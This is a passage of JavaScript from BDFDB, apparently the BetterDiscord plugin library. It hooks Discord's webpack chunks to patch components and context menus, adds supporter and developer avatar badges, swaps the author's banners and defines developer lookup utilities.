			Internal._processAvatarRender = function (user, avatar, className) {
				if (BDFDB.ReactUtils.isValidElement(avatar) && BDFDB.ObjectUtils.is(user) && (avatar.props.className || "").indexOf(BDFDB.disCN.bdfdbbadgeavatar) == -1) {
					avatar.props[InternalData.userIdAttribute] = user.id;
					let role = "", note = "", color, link, addBadge = Internal.settings.general.showSupportBadges;
					if (BDFDB_Patrons[user.id] && BDFDB_Patrons[user.id].active) {
						link = "https://www.patreon.com/MircoWittrien";
						role = BDFDB_Patrons[user.id].text || (BDFDB_Patron_Tiers[BDFDB_Patrons[user.id].tier] || {}).text;
						note = BDFDB_Patrons[user.id].text && (BDFDB_Patron_Tiers[BDFDB_Patrons[user.id].tier] || {}).text;
						color = BDFDB_Patrons[user.id].color;
						className = BDFDB.DOMUtils.formatClassName(avatar.props.className, className, addBadge && BDFDB.disCN.bdfdbhasbadge, BDFDB.disCN.bdfdbbadgeavatar, BDFDB.disCN.bdfdbsupporter, BDFDB.disCN[`bdfdbsupporter${BDFDB_Patrons[user.id].tier}`]);
					}
					else if (user.id == InternalData.myId) {
						addBadge = true;
						role = `Theme ${BDFDB.LanguageUtils.LibraryStrings.developer}`;
						className = BDFDB.DOMUtils.formatClassName(avatar.props.className, className, BDFDB.disCN.bdfdbhasbadge, BDFDB.disCN.bdfdbbadgeavatar, BDFDB.disCN.bdfdbdev);
					}
					if (role) {
						delete avatar.props[InternalData.userIdAttribute];
						if (avatar.type == "img") avatar = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.AvatarComponents.default, Object.assign({}, avatar.props, {
							size: Internal.LibraryComponents.AvatarComponents.Sizes.SIZE_40
						}));
						delete avatar.props.className;
						let newProps = {
							className: className,
							children: [avatar]
						};
						newProps[InternalData.userIdAttribute] = user.id;
						avatar = BDFDB.ReactUtils.createElement("div", newProps);
						if (addBadge) avatar.props.children.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
							text: role,
							note: note,
							tooltipConfig: {backgroundColor: color || ""},
							onClick: link ? (_ => BDFDB.DiscordUtils.openLink(link)) : (_ => {}),
							children: BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.bdfdbbadge
							})
						}));
						return avatar;
					}
				}
			};
			Internal._processAvatarMount = function (user, avatar, wrapper) {
				if (!user) return;
				if (wrapper) wrapper.setAttribute(InternalData.userIdAttribute, user.id);
				if (Node.prototype.isPrototypeOf(avatar) && (avatar.className || "").indexOf(BDFDB.disCN.bdfdbbadgeavatar) == -1) {
					avatar.setAttribute(InternalData.userIdAttribute, user.id);
					let role = "", note = "", color, link, addBadge = Internal.settings.general.showSupportBadges;
					if (BDFDB_Patrons[user.id] && BDFDB_Patrons[user.id].active) {
						link = "https://www.patreon.com/MircoWittrien";
						role = BDFDB_Patrons[user.id].text || (BDFDB_Patron_Tiers[BDFDB_Patrons[user.id].tier] || {}).text;
						note = BDFDB_Patrons[user.id].text && (BDFDB_Patron_Tiers[BDFDB_Patrons[user.id].tier] || {}).text;
						color = BDFDB_Patrons[user.id].color;
						avatar.className = BDFDB.DOMUtils.formatClassName(avatar.className, addBadge && BDFDB.disCN.bdfdbhasbadge, BDFDB.disCN.bdfdbbadgeavatar, BDFDB.disCN.bdfdbsupporter, BDFDB.disCN[`bdfdbsupporter${BDFDB_Patrons[user.id].tier}`]);
					}
					else if (user.id == InternalData.myId) {
						addBadge = true;
						role = `Theme ${BDFDB.LanguageUtils.LibraryStrings.developer}`;
						avatar.className = BDFDB.DOMUtils.formatClassName(avatar.className, addBadge && BDFDB.disCN.bdfdbhasbadge, BDFDB.disCN.bdfdbbadgeavatar, BDFDB.disCN.bdfdbdev);
					}
					if (addBadge && role && !avatar.querySelector(BDFDB.dotCN.bdfdbbadge)) {
						let badge = document.createElement("div");
						badge.className = BDFDB.disCN.bdfdbbadge;
						if (link) badge.addEventListener("click", _ => BDFDB.DiscordUtils.openLink(link));
						badge.addEventListener("mouseenter", _ => BDFDB.TooltipUtils.create(badge, role, {position: "top", note: note, backgroundColor: color || ""}));
						avatar.appendChild(badge);
					}
				}
			};
			Internal._processUserInfoNode = function (user, wrapper) {
				if (!user || !wrapper) return;
				if (InternalData.UserBackgrounds[user.id]) for (let property in InternalData.UserBackgrounds[user.id]) wrapper.style.setProperty(property, InternalData.UserBackgrounds[user.id][property], "important");
			};
			Internal.processMessageHeader = function (e) {
				if (e.instance.props.message && e.instance.props.message.author) {
					let avatarWrapper = e.returnvalue.props.avatar || BDFDB.ObjectUtils.get(e, "returnvalue.props.children.0");
					if (avatarWrapper && avatarWrapper.props && typeof avatarWrapper.props.children == "function") {
						let renderChildren = avatarWrapper.props.children;
						avatarWrapper.props.children = BDFDB.TimeUtils.suppress((...args) => {
							let renderedChildren = renderChildren(...args);
							return Internal._processAvatarRender(e.instance.props.message.author, renderedChildren, BDFDB.disCN.messageavatar) || renderedChildren;
						}, "Error in Avatar Render of MessageHeader!");
					}
					else if (avatarWrapper && avatarWrapper.type == "img") e.returnvalue.props.children[0] = Internal._processAvatarRender(e.instance.props.message.author, avatarWrapper) || avatarWrapper;
				}
			};
			Internal.processMemberListItem = function (e) {
				Internal._processAvatarMount(e.instance.props.user, e.node.querySelector(BDFDB.dotCN.avatarwrapper), e.node);
			};
			Internal.processPrivateChannel = function (e) {
				Internal._processAvatarMount(e.instance.props.user, e.node.querySelector(BDFDB.dotCN.avatarwrapper), e.node);
			};
			Internal.processAnalyticsContext = function (e) {
				if (e.instance.props.section != BDFDB.DiscordConstants.AnalyticsSections.PROFILE_MODAL && e.instance.props.section != BDFDB.DiscordConstants.AnalyticsSections.PROFILE_POPOUT) return;
				const user = BDFDB.ReactUtils.findValue(e.instance, "user");
				if (!user) return;
				const wrapper = e.node.querySelector(BDFDB.dotCNC.userpopout + BDFDB.dotCN.userprofile) || e.node;
				const avatar = e.node.querySelector(BDFDB.dotCN.avatarwrapper);
				if (avatar) Internal._processAvatarMount(user, e.instance.props.section == BDFDB.DiscordConstants.AnalyticsSections.PROFILE_POPOUT ? avatar.parentElement : avatar, wrapper);
				Internal._processUserInfoNode(user, wrapper);
			};
			Internal.processPeopleListItem = function (e) {
				if (e.instance.props.user) e.node.setAttribute(InternalData.userIdAttribute, e.instance.props.user.id);
			};
			Internal.processDiscordTag = function (e) {
				if (e.instance && e.instance.props && e.returnvalue && e.instance.props.user) e.returnvalue.props.user = e.instance.props.user;
			};
			Internal.processEmojiPicker = function (e) {
				if (BDFDB.ObjectUtils.toArray(PluginStores.loaded).filter(p => p.started).some(p => p.onSystemMessageOptionContextMenu || p.onSystemMessageOptionToolbar || p.onMessageOptionContextMenu || p.onMessageOptionToolbar)) e.instance.props.persistSearch = true;
			};
			Internal.processEmojiPickerListRow = function (e) {
				if (e.instance.props.emojiDescriptors && Internal.LibraryComponents.EmojiPickerButton.current && Internal.LibraryComponents.EmojiPickerButton.current.props && Internal.LibraryComponents.EmojiPickerButton.current.props.allowManagedEmojisUsage) for (let i in e.instance.props.emojiDescriptors) e.instance.props.emojiDescriptors[i] = Object.assign({}, e.instance.props.emojiDescriptors[i], {isDisabled: false});
			};
			
			Internal.addChunkObserver = function (pluginData, config) {
				let module;
				if (config.stringFind) module = BDFDB.ModuleUtils.findByString(config.stringFind, config.exported, true);
				else if (config.propertyFind) module = BDFDB.ModuleUtils.findByProperties(config.propertyFind, config.exported, true);
				else if (config.prototypeFind) module = BDFDB.ModuleUtils.findByPrototypes(config.prototypeFind, config.exported, true);
				else module = BDFDB.ModuleUtils.findByName(config.name, config.exported, true);
				if (module) {
					let exports = !config.exported && module.exports || module;
					exports = config.path && BDFDB.ObjectUtils.get(exports, config.path) || exports;
					exports && Internal.patchComponent(pluginData, Internal.isMemoOrForwardRef(exports) ? exports.default : exports, config);
				}
				else {
					if (!PluginStores.chunkObserver[config.mappedType]) {
						PluginStores.chunkObserver[config.mappedType] = {query: [], config};
						let filter;
						if (config.stringFind) filter = m => m && Internal.hasModuleStrings(m, config.stringFind) && m;
						else if (config.propertyFind) filter = m => [config.propertyFind].flat(10).filter(n => n).every(prop => {
							const value = m[prop];
							return value !== undefined && !(typeof value == "string" && !value);
						}) && m;
						else if (config.prototypeFind) filter = m =>  m.prototype && [config.prototypeFind].flat(10).filter(n => n).every(prop => {
							const value = m.prototype[prop];
							return value !== undefined && !(typeof value == "string" && !value);
						}) && m;
						else filter = m => m.displayName === config.name && m || m.render && m.render.displayName === config.name && m || m[config.name] && m[config.name].displayName === name && m[config.name];
						PluginStores.chunkObserver[config.mappedType].filter = filter;
					}
					PluginStores.chunkObserver[config.mappedType].query.push(pluginData);
				}
			};
			Internal.addQueuePatches = function (plugin) {
				if (!InternalData.ModuleUtilsConfig.QueuedComponents) return;
				plugin = plugin == BDFDB && Internal || plugin;
				for (let type of InternalData.ModuleUtilsConfig.QueuedComponents) if (typeof plugin[`on${type}`] == "function") {
					if (PluginStores.patchQueues[type].query.indexOf(plugin) == -1) {
						PluginStores.patchQueues[type].query.push(plugin);
						PluginStores.patchQueues[type].query.sort((x, y) => x.name < y.name ? -1 : x.name > y.name ? 1 : 0);
					}
				}
			};
			Internal.triggerQueuePatch = function (type, e) {
				if (e.returnvalue && BDFDB.ObjectUtils.is(PluginStores.patchQueues[type]) && BDFDB.ArrayUtils.is(PluginStores.patchQueues[type].query)) {
					for (let plugin of PluginStores.patchQueues[type].query) if(typeof plugin[`on${type}`] == "function") plugin[`on${type}`](e);
				}
			};
			Internal.addContextChunkObservers = function (plugin) {
				if (!InternalData.ModuleUtilsConfig.ContextMenuTypes) return;
				plugin = plugin == BDFDB && Internal || plugin;
				for (let type of InternalData.ModuleUtilsConfig.ContextMenuTypes) {
					type = `${type}ContextMenu`;
					if (typeof plugin[`on${InternalData.ModuleUtilsConfig.ContextMenuTypesMap[type] || type}`] == "function") {
						for (let module of PluginStores.contextChunkObserver[type].modules) Internal.patchContextMenu(plugin, type, module);
						if (PluginStores.contextChunkObserver[type].query.indexOf(plugin) == -1) {
							PluginStores.contextChunkObserver[type].query.push(plugin);
							PluginStores.contextChunkObserver[type].query.sort((x, y) => x.name < y.name ? -1 : x.name > y.name ? 1 : 0);
						}
					}
				}
			};
			Internal.patchContextMenu = function (plugin, type, module) {
				if (!module || !module.default) return;
				plugin = plugin == BDFDB && Internal || plugin;
				const mappedType = InternalData.ModuleUtilsConfig.ContextMenuTypesMap[type] || type;
				if (!InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType]) {
					const call = (args, props, returnValue, name) => {
						if (!returnValue || !returnValue.props || !returnValue.props.children || returnValue.props.children.__BDFDBPatchesCalled && returnValue.props.children.__BDFDBPatchesCalled[plugin.name]) return;
						returnValue.props.children.__BDFDBPatchesCalled = Object.assign({}, returnValue.props.children.__BDFDBPatchesCalled, {[plugin.name]: true});
						return plugin[`on${mappedType}`]({
							arguments: args,
							instance: {props: props},
							returnvalue: returnValue,
							component: module,
							methodname: "default",
							type: name
						});
					};
					BDFDB.PatchUtils.patch(plugin, module, "default", {after: e => {
						if (typeof plugin[`on${mappedType}`] != "function") return;
						else if (e.returnValue && e.returnValue.props.children !== undefined) {
							if (e.returnValue.props.navId) {
								e.returnValue.props.children = [e.returnValue.props.children].flat(10);
								call(e.methodArguments, e.methodArguments[0], e.returnValue, module.default.displayName);
							}
							if (e.returnValue.props.children && e.returnValue.props.children.type && e.returnValue.props.children.type.displayName) {
								const name = e.returnValue.props.children.type.displayName;
								const originalReturn = e.returnValue.props.children.type(e.returnValue.props.children.props);
								if (!originalReturn || !originalReturn.type) return;
								let newType = (...args) => {
									const returnValue = BDFDB.ReactUtils.createElement(originalReturn.type, originalReturn.props);
									if (returnValue.props.children) call(args, args[0], returnValue, name);
									else BDFDB.PatchUtils.patch(plugin, returnValue, "type", {after: e2 => {
										if (e2.returnValue && typeof plugin[`on${type}`] == "function") call(e2.methodArguments, e2.methodArguments[0], e2.returnValue, name);
									}}, {noCache: true});
									return returnValue;
								};
								newType.displayName = name;
								e.returnValue.props.children = BDFDB.ReactUtils.createElement(newType, e.returnValue.props.children.props);
							}
						}
						else BDFDB.PatchUtils.patch(plugin, e.returnValue, "type", {after: e2 => {
							if (e2.returnValue && typeof plugin[`on${mappedType}`] == "function") call(e2.methodArguments, e2.methodArguments[0], e2.returnValue, module.default.displayName);
						}}, {noCache: true});
					}}, {name: type});
				}
				else {
					const getProps = (props, keys) => {
						let newProps = Object.assign({}, BDFDB.ObjectUtils.is(props) ? props : typeof props == "string" ? {id: props} : {});
						for (const key of [keys].flat(10).filter(n => n)) {
							const store = `${Internal.LibraryModules.StringUtils.upperCaseFirstChar(key)}Store`;
							const getter = `get${Internal.LibraryModules.StringUtils.upperCaseFirstChar(key)}`;
							const value = props && props[key] || Internal.LibraryModules[store] && typeof Internal.LibraryModules[store][getter] == "function" && Internal.LibraryModules[store][getter](props && props.id || props);
							if (value) {
								newProps = Object.assign(newProps, {[key]: value});
								break;
							}
						}
						return newProps;
					};
					BDFDB.PatchUtils.patch(plugin, module, "default", {after: e => {
						if (typeof plugin[`on${mappedType}`] != "function") return;
						e.returnValue = [e.returnValue].flat(10).filter(n => n);
						return plugin[`on${mappedType}`]({
							arguments: e.methodArguments,
							instance: {props: InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType].keys && getProps(e.methodArguments[0], InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType].keys) || e.methodArguments[0]},
							returnvalue: e.returnValue,
							component: module,
							methodname: "default",
							type: type,
							subType: module.__BDFDB_ContextMenu_Patch_Name
						});
					}}, {name: type});
				}
			};
			
			BDFDB.ReactUtils.instanceKey = Object.keys(document.querySelector(BDFDB.dotCN.app) || {}).some(n => n.startsWith("__reactInternalInstance")) ? "_reactInternalFiber" : "_reactInternals";

			BDFDB.PluginUtils.load(BDFDB);
			Internal.settings = BDFDB.DataUtils.get(Internal);
			changeLogs = BDFDB.DataUtils.load(BDFDB, "changeLogs");
			BDFDB.PluginUtils.checkChangeLog(BDFDB);
			
			(_ => {
				const chunkName = "webpackChunkdiscord_app";
				const originalPush = window[chunkName].push;
				const patches = {};
				const handlePush = chunk => {
					for (const id in chunk[1]) {
						const origModule = chunk[1][id];
						chunk[1][id] = (module, exports, require) => {
							Reflect.apply(origModule, null, [module, exports, require]);
							const removedTypes = [];
							for (const type in PluginStores.chunkObserver) {
								const foundModule = PluginStores.chunkObserver[type].filter(exports) || exports.default && PluginStores.chunkObserver[type].filter(exports.default);
								if (foundModule) {
									Internal.patchComponent(PluginStores.chunkObserver[type].query, PluginStores.chunkObserver[type].config.exported ? foundModule : exports, PluginStores.chunkObserver[type].config);
									removedTypes.push(type);
									break;
								}
							}
							while (removedTypes.length) delete PluginStores.chunkObserver[removedTypes.pop()];
							
							let found = false, funcString = exports && exports.default && typeof exports.default == "function" && exports.default.toString();
							if (funcString && funcString.indexOf(".page") > -1 && funcString.indexOf(".section") > -1 && funcString.indexOf(".objectType") > -1) {
								const returnValue = exports.default({});
								if (returnValue && returnValue.props && returnValue.props.object == BDFDB.DiscordConstants.AnalyticsObjects.CONTEXT_MENU) {
									for (const type in PluginStores.contextChunkObserver) {
										if (PluginStores.contextChunkObserver[type].filter(returnValue.props.children)) {
											exports.__BDFDB_ContextMenuWrapper_Patch_Name = exports.__BDFDB_ContextMenu_Patch_Name;
											found = true;
											if (PluginStores.contextChunkObserver[type].modules.indexOf(exports) == -1) PluginStores.contextChunkObserver[type].modules.push(exports);
											for (const plugin of PluginStores.contextChunkObserver[type].query) Internal.patchContextMenu(plugin, type, exports);
											break;
										}
									}
								}
							}
							if (!found) for (const type in PluginStores.contextChunkObserver) {
								if (PluginStores.contextChunkObserver[type].filter(exports)) {
									if (PluginStores.contextChunkObserver[type].modules.indexOf(exports) == -1) PluginStores.contextChunkObserver[type].modules.push(exports);
									for (const plugin of PluginStores.contextChunkObserver[type].query) Internal.patchContextMenu(plugin, type, exports);
									break;
								}
							}
						};
						Object.assign(chunk[1][id], origModule, {toString: _ => origModule.toString()});
						patches[id] = [chunk, origModule];
					}
					return Reflect.apply(originalPush, window[chunkName], [chunk]);
				};
				
				Object.defineProperty(window[chunkName], "push", {
					configurable: true,
					get: _ => handlePush,
					set: newPush => {
						originalPush = newPush;
						Object.defineProperty(window[chunkName], "push", {
							value: handlePush,
							configurable: true,
							writable: true
						});
					}
				});
				Internal.removeChunkObserver = _ => {
					for (let id in patches) {
						patches[id][0] = patches[id][1];
						patches[id] = null;
					}
					Object.defineProperty(window[chunkName], "push", {
						configurable: true,
						get: _ => (chunk => Reflect.apply(originalPush, window[chunkName], [chunk]))
					});
				};
			})();
			
			if (InternalData.ModuleUtilsConfig.ContextMenuTypes) for (let type of InternalData.ModuleUtilsConfig.ContextMenuTypes) {
				type = `${type}ContextMenu`;
				if (!PluginStores.contextChunkObserver[type]) {
					const mappedType = InternalData.ModuleUtilsConfig.ContextMenuTypesMap[type] || type;
					PluginStores.contextChunkObserver[type] = {query: [], modules: []};
					if (!InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType]) PluginStores.contextChunkObserver[type].filter = m => {
						if (!m || !(m.default || m.type)) return;
						const d = m.default || m.type;
						if (d.displayName && d.displayName.endsWith("ContextMenu") && `${InternalData.ModuleUtilsConfig.ContextMenuTypes.find(t => d.displayName.indexOf(t) > -1)}ContextMenu` == type) {
							m.__BDFDB_ContextMenu_Patch_Name = type;
							return true;
						}
						else if (m.__BDFDB_ContextMenuWrapper_Patch_Name && m.__BDFDB_ContextMenuWrapper_Patch_Name.endsWith("ContextMenu") && `${InternalData.ModuleUtilsConfig.ContextMenuTypes.find(t => m.__BDFDB_ContextMenuWrapper_Patch_Name.indexOf(t) > -1)}ContextMenu` == type) {
							m.__BDFDB_ContextMenu_Patch_Name = type;
							return true;
						}
					};
					else PluginStores.contextChunkObserver[type].filter = m => {
						if (!m || !(m.default || m.type)) return;
						const d = m.default || m.type;
						if (d.displayName && InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType].items.indexOf(d.displayName) > -1) {
							m.__BDFDB_ContextMenu_Patch_Name = d.displayName;
							return true;
						}
						else {
							const subType = InternalData.ModuleUtilsConfig.ContextMenuSubItemsMap[mappedType].items.find(item => InternalData.ModuleUtilsConfig.Finder[item] && InternalData.ModuleUtilsConfig.Finder[item].strings && Internal.hasModuleStrings(d, InternalData.ModuleUtilsConfig.Finder[item].strings));
							if (subType) {
								m.__BDFDB_ContextMenu_Patch_Name = subType;
								return true;
							}
						}
					};
					PluginStores.contextChunkObserver[type].modules = BDFDB.ModuleUtils.find(PluginStores.contextChunkObserver[type].filter, {useExport: false, all: true}).map(m => m.exports).filter(n => n);
				}
			}
			
			Internal.patchPlugin(BDFDB);
			Internal.addQueuePatches(BDFDB);
			Internal.addContextChunkObservers(BDFDB);
			
			if (InternalData.ModuleUtilsConfig.QueuedComponents) for (let type of InternalData.ModuleUtilsConfig.QueuedComponents) if (!PluginStores.patchQueues[type]) PluginStores.patchQueues[type] = {query: [], modules: []};
			
			let languageChangeTimeout;
			if (Internal.LibraryModules.SettingsUtilsOld) BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.SettingsUtilsOld, ["updateRemoteSettings", "updateLocalSettings"], {after: e => {
				if (e.methodArguments[0] && e.methodArguments[0].locale) {
					BDFDB.TimeUtils.clear(languageChangeTimeout);
					languageChangeTimeout = BDFDB.TimeUtils.timeout(_ => {
						for (let pluginName in PluginStores.loaded) if (PluginStores.loaded[pluginName].started) BDFDB.PluginUtils.translate(PluginStores.loaded[pluginName]);
					}, 10000);
				}
			}});
			
			Internal.onSettingsClosed = function () {
				if (Internal.SettingsUpdated) {
					delete Internal.SettingsUpdated;
					Internal.forceUpdateAll();
				}
			};
			
			Internal.forceUpdateAll = function () {					
				BDFDB.MessageUtils.rerenderAll();
				BDFDB.PatchUtils.forceAllUpdates(BDFDB);
			};
			
			if (Internal.LibraryComponents.GuildComponents.BlobMask) {
				let newBadges = ["lowerLeftBadge", "upperLeftBadge"];
				BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryComponents.GuildComponents.BlobMask.prototype, "render", {
					before: e => {
						e.thisObject.props = Object.assign({}, Internal.LibraryComponents.GuildComponents.BlobMask.defaultProps, e.thisObject.props);
						for (let type of newBadges) if (!e.thisObject.state[`${type}Mask`]) e.thisObject.state[`${type}Mask`] = new Internal.LibraryComponents.Animations.Controller({spring: 0});
					},
					after: e => {
						let [children, index] = BDFDB.ReactUtils.findParent(e.returnValue, {name: "TransitionGroup"});
						if (index > -1) {
							children[index].props.children.push(!e.thisObject.props.lowerLeftBadge ? null : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.BadgeAnimationContainer, {
								className: BDFDB.disCN.guildlowerleftbadge,
								key: "lower-left-badge",
								animatedStyle: e.thisObject.getLowerLeftBadgeStyles(),
								children: e.thisObject.props.lowerLeftBadge
							}));
							children[index].props.children.push(!e.thisObject.props.upperLeftBadge ? null : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.BadgeAnimationContainer, {
								className: BDFDB.disCN.guildupperleftbadge,
								key: "upper-left-badge",
								animatedStyle: e.thisObject.getUpperLeftBadgeStyles(),
								children: e.thisObject.props.upperLeftBadge
							}));
						}
						[children, index] = BDFDB.ReactUtils.findParent(e.returnValue, {name: "mask"});
						if (index > -1) {
							children[index].props.children.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.rect, {
								x: -4,
								y: -4,
								width: e.thisObject.props.upperLeftBadgeWidth + 8,
								height: 24,
								rx: 12,
								ry: 12,
								transform: e.thisObject.getLeftBadgePositionInterpolation(e.thisObject.state.upperLeftBadgeMask, -1),
								fill: "black"
							}));
							children[index].props.children.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.rect, {
								x: -4,
								y: 28,
								width: e.thisObject.props.lowerLeftBadgeWidth + 8,
								height: 24,
								rx: 12,
								ry: 12,
								transform: e.thisObject.getLeftBadgePositionInterpolation(e.thisObject.state.lowerLeftBadgeMask),
								fill: "black"
							}));
						}
					}
				});
				BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryComponents.GuildComponents.BlobMask.prototype, "componentDidMount", {
					after: e => {
						for (let type of newBadges) e.thisObject.state[`${type}Mask`].update({
							spring: e.thisObject.props[type] != null ? 1 : 0,
							immediate: true
						}).start();
					}
				});
				BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryComponents.GuildComponents.BlobMask.prototype, "componentWillUnmount", {
					after: e => {
						for (let type of newBadges) if (e.thisObject.state[`${type}Mask`]) e.thisObject.state[`${type}Mask`].dispose();
					}
				});
				BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryComponents.GuildComponents.BlobMask.prototype, "componentDidUpdate", {
					after: e => {
						for (let type of newBadges) if (e.thisObject.props[type] != null && e.methodArguments[0][type] == null) {
							e.thisObject.state[`${type}Mask`].update({
								spring: 1,
								immediate: !document.hasFocus(),
								config: {friction: 30, tension: 900, mass: 1}
							}).start();
						}
						else if (e.thisObject.props[type] == null && e.methodArguments[0][type] != null) {
							e.thisObject.state[`${type}Mask`].update({
								spring: 0,
								immediate: !document.hasFocus(),
								config: {duration: 150, friction: 10, tension: 100, mass: 1}
							}).start();
						}
					}
				});
				Internal.LibraryComponents.GuildComponents.BlobMask.prototype.getLeftBadgePositionInterpolation = function (e, t) {
					return void 0 === t && (t = 1), e.springs.spring.to([0, 1], [20, 0]).to(function (e) {
						return "translate(" + e * -1 + " " + e * t + ")";
					});
				};
				Internal.LibraryComponents.GuildComponents.BlobMask.prototype.getLowerLeftBadgeStyles = function () {
					var e = this.state.lowerLeftBadgeMask.springs.spring;
					return {
						opacity: e.to([0, .5, 1], [0, 0, 1]),
						transform: e.to(function (e) {
							return "translate(" + -1 * (16 - 16 * e) + "px, " + (16 - 16 * e) + "px)";
						})
					};
				};
				Internal.LibraryComponents.GuildComponents.BlobMask.prototype.getUpperLeftBadgeStyles = function () {
					var e = this.state.upperLeftBadgeMask.springs.spring;
					return {
						opacity: e.to([0, .5, 1], [0, 0, 1]),
						transform: e.to(function (e) {
							return "translate(" + -1 * (16 - 16 * e) + "px, " + -1 * (16 - 16 * e) + "px)";
						})
					};
				};
				let extraDefaultProps = {};
				for (let type of newBadges) extraDefaultProps[`${type}Width`] = 16;
				Internal.setDefaultProps(Internal.LibraryComponents.GuildComponents.BlobMask, extraDefaultProps);
			}
			
			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.GuildStore, "getGuild", {after: e => {
				if (e.returnValue && e.methodArguments[0] == InternalData.myGuildId) e.returnValue.banner = `https://mwittrien.github.io/BetterDiscordAddons/Library/_res/BDFDB.banner.png`;
			}});
			
			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.UserStore, "getUser", {after: e => {
				if (e.returnValue && e.methodArguments[0] == InternalData.myId) e.returnValue.banner = `https://mwittrien.github.io/BetterDiscordAddons/Library/_res/DevilBro.banner.png`;
			}});

			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.IconUtils, "getGuildBannerURL", {instead: e => {
				return e.methodArguments[0].id == InternalData.myGuildId ? e.methodArguments[0].banner : e.callOriginalMethod();
			}});

			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.IconUtils, "getUserBannerURL", {instead: e => {
				return e.methodArguments[0].id == InternalData.myId ? e.methodArguments[0].banner : e.callOriginalMethod();
			}});
			
			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.BannerUtils, "getUserBannerURLForContext", {instead: e => {
				return e.methodArguments[0].user && e.methodArguments[0].user.id == InternalData.myId ? e.methodArguments[0].user.banner : e.callOriginalMethod();
			}});
			
			BDFDB.PatchUtils.patch(BDFDB, Internal.LibraryModules.EmojiStateUtils, "getEmojiUnavailableReason", {after: e => {
				if (Internal.LibraryComponents.EmojiPickerButton.current && Internal.LibraryComponents.EmojiPickerButton.current.props && Internal.LibraryComponents.EmojiPickerButton.current.props.allowManagedEmojisUsage) return null;
			}});
			
			Internal.forceUpdateAll();
		
			const pluginQueue = window.BDFDB_Global && BDFDB.ArrayUtils.is(window.BDFDB_Global.pluginQueue) ? window.BDFDB_Global.pluginQueue : [];

			if (BDFDB.UserUtils.me.id == InternalData.myId || BDFDB.UserUtils.me.id == "350635509275557888") {
				BDFDB.DevUtils = {};
				BDFDB.DevUtils.generateClassId = Internal.generateClassId;
				BDFDB.DevUtils.findByIndex = function (index) {
					return BDFDB.DevUtils.req.c[index];
				};
				BDFDB.DevUtils.findPropAny = function (...strings) {
					window.t = {"$filter":(prop => [...strings].flat(10).filter(n => typeof n == "string").every(string => prop.toLowerCase().indexOf(string.toLowerCase()) > -1))};
					for (let i in BDFDB.DevUtils.req.c) if (BDFDB.DevUtils.req.c.hasOwnProperty(i)) {
						let m = BDFDB.DevUtils.req.c[i].exports;
						if (m && typeof m == "object") for (let j in m) if (window.t.$filter(j)) window.t[j + "_" + i] = m;
						if (m && typeof m == "object" && typeof m.default == "object") for (let j in m.default) if (window.t.$filter(j)) window.t[j + "_default_" + i] = m.default;
					}
					console.clear();
					console.log(window.t);
				};
				BDFDB.DevUtils.findPropFunc = function (...strings) {
					window.t = {"$filter":(prop => [...strings].flat(10).filter(n => typeof n == "string").every(string => prop.toLowerCase().indexOf(string.toLowerCase()) > -1))};
					for (let i in BDFDB.DevUtils.req.c) if (BDFDB.DevUtils.req.c.hasOwnProperty(i)) {
						let m = BDFDB.DevUtils.req.c[i].exports;
						if (m && typeof m == "object") for (let j in m) if (window.t.$filter(j) && typeof m[j] != "string") window.t[j + "_" + i] = m;
						if (m && typeof m == "object" && typeof m.default == "object") for (let j in m.default) if (window.t.$filter(j) && typeof m.default[j] != "string") window.t[j + "_default_" + i] = m.default;
					}
					console.clear();
					console.log(window.t);
				};
				BDFDB.DevUtils.findPropStringLib = function (...strings) {
					window.t = {"$filter":(prop => [...strings].flat(10).filter(n => typeof n == "string").every(string => prop.toLowerCase().indexOf(string.toLowerCase()) > -1))};
					for (let i in BDFDB.DevUtils.req.c) if (BDFDB.DevUtils.req.c.hasOwnProperty(i)) {
						let m = BDFDB.DevUtils.req.c[i].exports;
						if (m && typeof m == "object") for (let j in m) if (window.t.$filter(j) && typeof m[j] == "string" && /^[A-z0-9]+\-[A-z0-9_-]{6}$/.test(m[j])) window.t[j + "_" + i] = m;
						if (m && typeof m == "object" && typeof m.default == "object") for (let j in m.default) if (window.t.$filter(j) && typeof m.default[j] == "string" && /^[A-z0-9]+\-[A-z0-9_-]{6}$/.test(m.default[j])) window.t[j + "_default_" + i] = m.default;
					}
					console.clear();
					console.log(window.t);
				};
				BDFDB.DevUtils.findNameAny = function (...strings) {
					window.t = {"$filter":(m => [...strings].flat(10).filter(n => typeof n == "string").some(string => typeof m.displayName == "string" && m.displayName.toLowerCase().indexOf(string.toLowerCase()) > -1 || m.name == "string" && m.name.toLowerCase().indexOf(string.toLowerCase()) > -1))};
					for (let i in BDFDB.DevUtils.req.c) if (BDFDB.DevUtils.req.c.hasOwnProperty(i)) {
						let m = BDFDB.DevUtils.req.c[i].exports;
						if (m && (typeof m == "object" || typeof m == "function") && window.t.$filter(m)) window.t[(m.displayName || m.name) + "_" + i] = m;
						if (m && (typeof m == "object" || typeof m == "function") && m.default && (typeof m.default == "object" || typeof m.default == "function") && window.t.$filter(m.default)) window.t[(m.default.displayName || m.default.name) + "_" + i] = m.default;
					}
					console.clear();
					console.log(window.t);
				};
				BDFDB.DevUtils.findCodeAny = function (...strings) {
					window.t = {"$filter":(m => Internal.hasModuleStrings(m, strings, true))};
					for (let i in BDFDB.DevUtils.req.c) if (BDFDB.DevUtils.req.c.hasOwnProperty(i)) {
